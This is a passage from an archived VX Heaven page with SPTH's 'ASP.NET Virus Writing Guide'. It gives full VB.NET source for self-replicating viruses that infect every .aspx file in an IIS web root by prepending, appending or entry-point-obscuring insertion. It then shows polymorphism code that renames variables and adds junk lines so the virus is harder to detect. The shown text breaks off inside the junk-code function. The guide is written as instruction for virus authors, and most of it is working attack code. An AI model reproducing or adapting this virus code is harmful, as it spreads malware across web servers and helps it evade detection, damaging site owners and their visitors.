@@ -1,0 +1,600 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> SPTH 'ASP.NET Virus Writing Guide' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="SPTH"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,ASP.NET Virus Writing Guide, find, trash, code, file, number, cont, wpointer, pointer, line, pointerw, searchs, games, words, system, place"/>
+<meta name="Description" content="This time I've found another victim: ASP.NET. It is a pre-compiled language running on web-servers like IIS. I want to explain 'pre-compiled' a little bit: The server, when it runs a specific file for the first time, compiles it for execution (not as i.E. PHP, which are just interpreted) and saves the compiled version of the file. The advantage: The next executions are a lot faster than at pre-processor languages like PHP. The advantage in contrast to ASP is that we can use the whole amount of functions, methods, classes provided by the .NET Framework. ASP.NET scripts can be written in VB.NET, C#, C++ and J#. I've desided to use VB.NET for this article. For the codes I've used .NET Framework 1.1 and 2.0 beta (at IIS), and the codes run at both environment. Well, now let's look at the ASP.NET infection :)"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"ea9b39b8671495cbd48523629895c3acd00b33b2-1498755599-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp29.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>ASP.NET Virus Writing Guide</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em><a href="/vx.php?fid=1512#f1512">Ready Rangers Liberation Front [7]</a></em><br/> <em>November 2005</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp29.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp29">Back to index</a>] [<a href="/lib/vsp29.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#c1">Intro Words</a></li>
+<li><a href="#c2">File infection</a>
+<ul>
+<li><a href="#c21">Prepending</a></li>
+<li><a href="#c22">Appending</a></li>
+<li><a href="#c23">Entry Point Obscuring</a></li>
+</ul></li>
+<li><a href="#c3">Polymorphism</a>
+<ul>
+<li><a href="#c31">Variable Changing</a></li>
+<li><a href="#c32">Adding Trash</a></li>
+<li><a href="#c33">Number Changing</a></li>
+<li><a href="#c34">Lower/Upper Case Games</a></li>
+<li><a href="#c35">Space Games</a></li>
+<li><a href="#c36">Colon Games</a></li>
+</ul></li>
+<li><a href="#c4">Last words</a></li>
+</ul>
+<h2><a name="c1"></a>Intro Words</h2>
+<p>This time I've found another victim: ASP.NET. It is a pre-compiled language running on web-servers like IIS. I want to explain 'pre-compiled' a little bit: The server, when it runs a specific file for the first time, compiles it for execution (not as i.E. PHP, which are just interpreted) and saves the compiled version of the file. The advantage: The next executions are a lot faster than at pre-processor languages like PHP. The advantage in contrast to ASP is that we can use the whole amount of functions, methods, classes provided by the .NET Framework. ASP.NET scripts can be written in VB.NET, C#, C++ and J#. I've desided to use VB.NET for this article. For the codes I've used .NET Framework 1.1 and 2.0 beta (at IIS), and the codes run at both environment. Well, now let's look at the ASP.NET infection :)</p>
+<h2><a name="c2"></a>File infection</h2>
+<h3><a name="c21"></a>Prepending</h3>
+<p>As always, I would like to start with the prepender virus for giving you the first ideas of that language. As I was not able to find a command for getting the own path of the current executed file (__FILE__, %0, ... in other languages), the virus searchs in every *.aspx file in the standart wwwroot folder for itself. When it found itself, it searchs for victims and infect them. More detailed explained after the code.</p>
+<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;&lt;!-- LUX --&gt;<br/>
+&lt;html&gt;<br/>
+&lt;head&gt;<br/>
+&nbsp; &lt;script language=&quot;VB&quot; runat=&quot;server&quot;&gt;<br/>
+&nbsp; Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)<br/>
+&nbsp; &nbsp; Try<br/>
+&nbsp; &nbsp; &nbsp; Dim di As New System.IO.DirectoryInfo(&quot;C:\Inetpub\wwwroot&quot;)<br/>
+&nbsp; &nbsp; &nbsp; Dim fiArr As System.IO.FileInfo() = di.GetFiles(&quot;*.aspx&quot;)<br/>
+&nbsp; &nbsp; &nbsp; Dim fri As System.IO.FileInfo<br/>
+&nbsp; &nbsp; &nbsp; Dim line, file_cont As String<br/>
+&nbsp; &nbsp; &nbsp; Dim i,IsInf As Integer<br/>
+&nbsp; &nbsp; &nbsp; Dim VirCode As String = &quot;&quot;<br/>
+&nbsp; &nbsp; &nbsp; For Each fri In fiArr<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Dim file_pointer As New System.IO.StreamReader(&quot;C:\Inetpub\wwwroot\&quot;+fri.Name)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Do<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; line = file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_cont=file_cont+line+Chr(13)+Chr(10)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Loop Until line Is Nothing<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_pointer.Close()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; For i=0 to file_cont.Length-12<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If file_cont.Substring(i, 12) = &quot;&lt;!&quot;+&quot;-- LUX --&gt;&quot; Then VirCode = file_cont.Substring(i-1, 1613)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; &nbsp; For Each fri In fiArr<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; IsInf=0<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; file_cont=&quot;&quot;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Dim file_pointer As New System.IO.StreamReader(&quot;C:\Inetpub\wwwroot\&quot;+fri.Name)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Do<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; line = file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_cont=file_cont+line+Chr(13)+Chr(10)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Loop Until line Is Nothing<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; file_pointer.Close()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; For i=0 to file_cont.Length-12<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If file_cont.Substring(i, 12) = &quot;&lt;!&quot;+&quot;-- LUX --&gt;&quot; Then IsInf = 1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Next &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; If IsInf &lt;&gt; 1 Then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim file_pointerW As New System.IO.StreamWriter(&quot;C:\Inetpub\wwwroot\&quot;+fri.Name)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_pointerW.WriteLine(VirCode+Chr(13)+Chr(10)+file_cont)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_pointerW.Close()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i=file_cont.Length<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; End If<br/>
+&nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; Catch ex As Exception<br/>
+&nbsp; &nbsp; End Try<br/>
+&nbsp; End Sub<br/>
+&nbsp; &lt;/script&gt;<br/>
+&lt;/head&gt;<br/>
+&lt;body&gt;<br/>
+&lt;p id=&quot;ausgabe&quot; runat=&quot;server&quot;&gt;&lt;/p&gt;<br/>
+&lt;/body&gt;<br/>
+&lt;/html&gt;<br/>
+&nbsp;</div>
+<p>Long code for a simple prepender, hmm? Well, I already gave you the reason. Now the explanaion:</p>
+<ul>
+<li>Opens the standart folder of wwwroot ("C:\Inetpub\wwwroot")</li>
+<li>Gets all *.aspx files in there</li>
+<li>Searchs for its code in every *.aspx file</li>
+<li>Saves its codes</li>
+<li>Searchs for uninfected victims</li>
+<li>Reads the code</li>
+<li>Writes the viruscode and the original code to the file</li>
+</ul>
+<h3><a name="c22"></a>Appending</h3>
+<p>This code is another standart-infection-type, so let's look at it. This time let's put the code after the original filecontent.</p>
+<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;&lt;!-- LUX --&gt;<br/>
+&lt;html&gt;<br/>
+&lt;head&gt;<br/>
+&nbsp; &lt;script language=&quot;VB&quot; runat=&quot;server&quot;&gt;<br/>
+&nbsp; Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)<br/>
+&nbsp; &nbsp; Try<br/>
+&nbsp; &nbsp; &nbsp; Dim di As New System.IO.DirectoryInfo(&quot;C:\Inetpub\wwwroot&quot;)<br/>
+&nbsp; &nbsp; &nbsp; Dim fiArr As System.IO.FileInfo() = di.GetFiles(&quot;*.aspx&quot;)<br/>
+&nbsp; &nbsp; &nbsp; Dim fri As System.IO.FileInfo<br/>
+&nbsp; &nbsp; &nbsp; Dim line, file_cont As String<br/>
+&nbsp; &nbsp; &nbsp; Dim i,IsInf As Integer<br/>
+&nbsp; &nbsp; &nbsp; Dim VirCode As String = &quot;&quot;<br/>
+&nbsp; &nbsp; &nbsp; For Each fri In fiArr<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Dim file_pointer As New System.IO.StreamReader(&quot;C:\Inetpub\wwwroot\&quot;+fri.Name)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Do<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; line = file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_cont=file_cont+line+Chr(13)+Chr(10)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Loop Until line Is Nothing<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_pointer.Close()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; For i=0 to file_cont.Length-12<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If file_cont.Substring(i, 12) = &quot;&lt;!&quot;+&quot;-- LUX --&gt;&quot; Then VirCode = file_cont.Substring(i-1, 1613)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; &nbsp; For Each fri In fiArr<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; IsInf=0<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; file_cont=&quot;&quot;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Dim file_pointer As New System.IO.StreamReader(&quot;C:\Inetpub\wwwroot\&quot;+fri.Name)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Do<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; line = file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_cont=file_cont+line+Chr(13)+Chr(10)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Loop Until line Is Nothing<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; file_pointer.Close()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; For i=0 to file_cont.Length-12<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If file_cont.Substring(i, 12) = &quot;&lt;!&quot;+&quot;-- LUX --&gt;&quot; Then IsInf = 1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Next &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; If IsInf &lt;&gt; 1 Then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim file_pointerW As New System.IO.StreamWriter(&quot;C:\Inetpub\wwwroot\&quot;+fri.Name)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_pointerW.WriteLine(file_cont+Chr(13)+Chr(10)+VirCode)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_pointerW.Close()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i=file_cont.Length<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; End If<br/>
+&nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; Catch ex As Exception<br/>
+&nbsp; &nbsp; End Try<br/>
+&nbsp; End Sub<br/>
+&nbsp; &lt;/script&gt;<br/>
+&lt;/head&gt;<br/>
+&lt;/html&gt;<br/>
+&nbsp;</div>
+<p>There is not too much difference to the prepender code.</p>
+<ul>
+<li>Opens the standart folder of wwwroot ("C:\Inetpub\wwwroot")</li>
+<li>Gets all *.aspx files in there</li>
+<li>Searchs for its code in every *.aspx file</li>
+<li>Saves its codes</li>
+<li>Searchs for uninfected victims</li>
+<li>Reads the code</li>
+<li>Writes the original code and the viruscode to the file</li>
+</ul>
+<h3><a name="c23"></a>Entry Point Obscuring</h3>
+<p>This is the first techniqually interesting type of infection: Anywhere in the middle: EPO The virus searchs for a valueable place which could be infected, and does it. To be more precicly it searchs for a code between the html-statements. That means, it searchs for '>' to infect that place. Better explanation follows at the end.</p>
+<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&lt;html&gt;<br/>
+&lt;head&gt;<br/>
+&nbsp; &lt;!-- LUX --&gt;<br/>
+&nbsp; &lt;script language=&quot;VB&quot; runat=&quot;server&quot;&gt;<br/>
+&nbsp; Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)<br/>
+&nbsp; &nbsp; &nbsp;Try<br/>
+&nbsp; &nbsp; &nbsp; Dim di As New System.IO.DirectoryInfo(&quot;C:\Inetpub\wwwroot&quot;)<br/>
+&nbsp; &nbsp; &nbsp; Dim fiArr As System.IO.FileInfo() = di.GetFiles(&quot;*.aspx&quot;)<br/>
+&nbsp; &nbsp; &nbsp; Dim fri As System.IO.FileInfo<br/>
+&nbsp; &nbsp; &nbsp; Dim line, file_cont As String<br/>
+&nbsp; &nbsp; &nbsp; Dim i,IsInf,rnd_num,place_c,place As Integer<br/>
+&nbsp; &nbsp; &nbsp; Dim VirCode As String = &quot;&quot;<br/>
+&nbsp; &nbsp; &nbsp; Dim placesarr(235) As Integer<br/>
+&nbsp; &nbsp; &nbsp; rnd_num=0<br/>
+&nbsp; &nbsp; &nbsp; place_c=0<br/>
+&nbsp; &nbsp; &nbsp; For Each fri In fiArr<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Dim file_pointer As New System.IO.StreamReader(&quot;C:\Inetpub\wwwroot\&quot;+fri.Name)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Do<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; line = file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_cont=file_cont+line+Chr(13)+Chr(10)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Loop Until line Is Nothing<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; file_pointer.Close()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; For i=0 to file_cont.Length-12<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If file_cont.Substring(i, 12) = &quot;&lt;!&quot;+&quot;-- LUX --&gt;&quot; Then VirCode = file_cont.Substring(i-1, 2494)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; rnd_num=rnd_num+fri.Length<br/>
+&nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; &nbsp; For Each fri In fiArr<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; IsInf=0<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; file_cont=&quot;&quot;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Dim file_pointer As New System.IO.StreamReader(&quot;C:\Inetpub\wwwroot\&quot;+fri.Name)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Do<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; line = file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_cont=file_cont+line+Chr(13)+Chr(10)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Loop Until line Is Nothing<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; file_pointer.Close()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; For i=0 to file_cont.Length-12<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If file_cont.Substring(i, 12) = &quot;&lt;!&quot;+&quot;-- LUX --&gt;&quot; Then IsInf = 1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; If IsInf &lt;&gt; 1 Then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; For i=0 to file_cont.Length-10<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If file_cont.Substring(i,1)=&quot;&gt;&quot; Then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; place_c=place_c+1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; placesarr(place_c)=i+2<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End If<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If i+7 &lt;= file_cont.Length Then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If file_cont.Substring(i,7)=&quot;&lt;script&quot; Then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim found_script As Integer=0<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; While found_script=0<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i=i+1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If file_cont.Substring(i,9)=&quot;&lt;/&quot;+&quot;script&gt;&quot; Then found_script=1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End While<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End If<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End If<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim file_pointerW As New System.IO.StreamWriter(&quot;C:\Inetpub\wwwroot\&quot;+fri.Name)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; place=placesarr(rnd_num Mod place_c)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_pointerW.WriteLine(file_cont.Substring(0,place-1)+VirCode+file_cont.Substring(place-1,file_cont.Length-place-1))<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file_pointerW.Close()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i=file_cont.Length<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; End If<br/>
+&nbsp; &nbsp; &nbsp; Next<br/>
+&nbsp; &nbsp; &nbsp; ausgabe.InnerHtml=place<br/>
+&nbsp; &nbsp; Catch ex As Exception<br/>
+&nbsp; &nbsp; End Try<br/>
+&nbsp; End Sub<br/>
+&nbsp; &lt;/script&gt;<br/>
+&lt;/head&gt;<br/>
+&lt;body&gt;<br/>
+&lt;p id=&quot;ausgabe&quot; runat=&quot;server&quot;&gt;&lt;/p&gt;<br/>
+&lt;/body&gt;<br/>
+&lt;/html&gt;<br/>
+&nbsp;</div>
+<ul>
+<li>Opens the standart folder of wwwroot ("C:\Inetpub\wwwroot")</li>
+<li>Gets all *.aspx files in there</li>
+<li>Searchs for its code in every *.aspx file</li>
+<li>Saves its codes</li>
+<li>Searchs for potentially victims</li>
+<li>Reads the victim-code</li>
+<li>Searchs for potentially places to infect (end-html-statements '>')</li>
+<li>Gets one place to infect</li>
+<li>Writes the first part of victim to host</li>
+<li>Writes the virus to host</li>
+<li>Writes the second part of victim to host</li>
+</ul>
+<h2><a name="c3"></a>Polymorphism</h2>
+<h3><a name="c31"></a>Variable Changing</h3>
+<p>This is a standart polymorphism technique for script-viruses - and I think it should be done in every infectable language; so I desided to do it here too. Every polymorphism needs random numbers. The .NET Framework provides the random numbers not as function or methode (as it's in most other languages), but as System.Random - Object. This is quite strange, but not more difficult - just different. Well, variable changing means to rename every variable or function name in the whole code. As there is no command for the own file (or at least I did not find one), I used a static path-name. But that does not mind, because in a real virus we have to search for the own code anyway.</p>
+<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&lt;%@ Page Language=&quot;VB&quot; %&gt;<br/>
+&lt;script runat=&quot;server&quot;&gt;<br/>
+Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)<br/>
+&nbsp; Dim my_file_name As String = &quot;C:\Inetpub\wwwroot\localstart.aspx&quot;<br/>
+&nbsp; Dim my_file_code, my_code_line As String<br/>
+&nbsp; Dim file_pointer As New System.IO.StreamReader(my_file_name)<br/>
+&nbsp; Do<br/>
+&nbsp; &nbsp; my_code_line=file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; my_file_code=my_file_code+my_code_line+Chr(13)+Chr(10)<br/>
+&nbsp; Loop Until my_code_line Is Nothing<br/>
+<br/>
+&nbsp; file_pointer.Close<br/>
+&nbsp; Dim my_var_arr() As String = {&quot;my_file_name&quot;,&quot;my_file_code&quot;,&quot;my_code_line&quot;,&quot;file_pointer&quot;,&quot;my_var_arr&quot;,&quot;one_var_name&quot;,&quot;my_arr_obj&quot;,&quot;file_Wpointer&quot;,&quot;new_var_name&quot;,&quot;counter_i&quot;,&quot;new_name_length&quot;,&quot;find_new_name&quot;}<br/>
+&nbsp; Dim one_var_name As String<br/>
+&nbsp; Dim my_arr_obj As new System.Random()<br/>
+&nbsp; For Each one_var_name In my_var_arr<br/>
+&nbsp; &nbsp; my_code_line=find_new_name(my_arr_obj.Next(10),my_arr_obj)<br/>
+&nbsp; &nbsp; my_file_code=my_file_code.Replace(one_var_name, my_code_line)<br/>
+&nbsp; Next<br/>
+&nbsp; Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)<br/>
+&nbsp; file_Wpointer.WriteLine(my_file_code)<br/>
+&nbsp; file_Wpointer.Close<br/>
+End Sub<br/>
+<br/>
+Function find_new_name(new_name_length As Integer, my_arr_obj As Random)<br/>
+&nbsp; Dim new_var_name As String = &quot;&quot;<br/>
+&nbsp; Dim counter_i As Integer<br/>
+&nbsp; new_name_length=new_name_length+5<br/>
+&nbsp; For counter_i = 0 to new_name_length<br/>
+&nbsp; &nbsp; new_var_name=new_var_name+Chr(my_arr_obj.Next(26)+97)<br/>
+&nbsp; Next<br/>
+&nbsp; find_new_name=new_var_name<br/>
+End Function<br/>
+&lt;/script&gt;<br/>
+&nbsp;</div>
+<ul>
+<li>Opens itself (by static path)</li>
+<li>Reads whole own code</li>
+<li>Closes itself</li>
+<li>Makes an array of all used variables</li>
+<li>Does a for-next for all entries in the array</li>
+<li>Gets random name with random length by the find_new_name function</li>
+<li>Replaces the old variable with the new one</li>
+<li>Writes the new code the the own file</li>
+</ul>
+<h3><a name="c32"></a>Adding Trash</h3>
+<p>Now let's try to add some trash into the ASP.NET code. First think: What could be trash?</p>
+<p>I thought of the following stuff:</p>
+<pre>
+       -> Commends:
+                * Rem anything
+                * ' anything
+       -> Variable Definition:
+                * Dim [anything] As String
+                * Dim [anything] As String = "[Anything]"
+                * Dim [anything] As Integer
+</pre>
+<p>There would be much more possible junk, but for the first try, let's use these six different options. (Some further thinks would be the writing of not used objects like Dim anything As new System.Random() or other stuff.)</p>
+<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;&lt;%@ Page Language=&quot;VB&quot; Debug=&quot;True&quot; %&gt;<br/>
+&nbsp;&lt;script runat=&quot;server&quot;&gt;<br/>
+&nbsp;Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)<br/>
+&nbsp; Dim my_file_name As String = &quot;C:\Inetpub\wwwroot\localstart.aspx&quot;<br/>
+&nbsp; Dim my_file_code(150), my_code_line, trash_line As String<br/>
+&nbsp; Dim i As Integer = 0<br/>
+&nbsp; Dim my_arr_obj As new System.Random()<br/>
+&nbsp; Dim file_pointer As New System.IO.StreamReader(my_file_name)<br/>
+&nbsp; Do<br/>
+&nbsp; &nbsp; my_code_line=file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; my_file_code(i)=my_code_line<br/>
+&nbsp; &nbsp; i=i+1<br/>
+&nbsp; Loop Until my_code_line Is Nothing<br/>
+&nbsp; file_pointer.Close<br/>
+&nbsp; Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)<br/>
+&nbsp; For Each my_code_line In my_file_code<br/>
+&nbsp; &nbsp; If my_code_line &lt;&gt; &quot;&quot; Then<br/>
+&nbsp; &nbsp; &nbsp; If Mid(my_code_line,1,1)=&quot; &quot; Then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; If my_arr_obj.Next(5)=1 Then file_Wpointer.WriteLine(find_trash(my_arr_obj.Next(6), my_arr_obj))<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; file_Wpointer.WriteLine(my_code_line)<br/>
+&nbsp; &nbsp; &nbsp; End If<br/>
+&nbsp; &nbsp; End If<br/>
+&nbsp; Next<br/>
+&nbsp; file_Wpointer.Close<br/>
+&nbsp;End Sub<br/>
+&nbsp;Function find_trash(which_trash As Integer, my_arr_obj As Random)<br/>
+&nbsp; If which_trash = 1 Then find_trash=&quot;Dim &quot;+find_new_name(my_arr_obj.Next(10), my_arr_obj)+&quot; As String&quot;<br/>
+&nbsp; If which_trash = 2 Then find_trash=&quot;Dim &quot;+find_new_name(my_arr_obj.Next(10), my_arr_obj)+&quot; As String =&quot;+Chr(34)+find_new_name(my_arr_obj.Next(20), my_arr_obj)+Chr(34)<br/>
+&nbsp; If which_trash = 3 Then find_trash=&quot;Dim &quot;+find_new_name(my_arr_obj.Next(10), my_arr_obj)+&quot; As Integer&quot;<br/>
